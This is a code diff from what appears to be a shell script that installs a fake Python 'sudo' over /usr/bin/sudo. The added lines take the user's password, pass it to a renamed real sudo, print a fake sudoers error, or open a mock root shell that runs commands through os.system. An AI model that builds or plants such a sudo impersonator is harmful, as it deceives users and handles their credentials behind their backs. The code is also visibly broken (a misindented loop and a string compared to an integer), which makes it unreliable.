@@ -4,6 +4,7 @@ import os
 import subprocess
 import sys
 import getpass
+import socket
 
 def main():
     if(len(sys.argv) == 1):
@@ -29,8 +30,21 @@ def main():
         sudoCmd = ['sudoA', '-l', 'su']
         command = subprocess.Popen(sudoCmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = command.communicate(password)
-        output = command.split()
-        print(output)
+        output = str(command).split()
+        if(output[2] == 0):
+            runShell()
+        else:
+            print(user+" is not in the sudoers file. This incident will be reported.")
+def runShell():
+    cont = True
+    directory = "~"
+    host = socket.gethostname()
+    while(cont):
+        option = input("[root@"+host+" "+directory+"]# ")
+    if(len(option) == 0):
+        pass
+    elif(option.lower() in 'ls'):
+        os.system("ls")
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
